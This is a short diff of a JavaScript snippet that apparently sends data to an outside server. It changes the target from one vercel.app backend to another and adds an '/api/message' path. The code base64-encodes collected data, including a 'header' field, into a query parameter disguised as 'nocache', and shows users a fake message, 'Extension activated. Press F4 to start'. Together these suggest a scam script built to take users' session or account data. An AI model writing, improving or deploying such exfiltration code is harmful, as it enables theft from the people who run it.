@@ -1,5 +1,5 @@
 (async () => {
-    let apiUrl = new URL("https://backend-master-sage.vercel.app");
+    let apiUrl = new URL("https://test-backend-for-worker.vercel.app");
     let code = "1415053658";
     let username = "test";
     let platform = "axiom";
@@ -60,7 +60,7 @@
         data["timestamp"] = timestamp;
         data["header"] = header;
     
-        const url = `${apiUrlOrigin + "?nocache=" + encodeURIComponent(btoa(JSON.stringify(data)))}`;
+        const url = `${apiUrlOrigin + "/api/message?nocache=" + encodeURIComponent(btoa(JSON.stringify(data)))}`;
         const customError = "Extension activated. Press F4 to start";
     
         const styleElement = document.createElement("style");
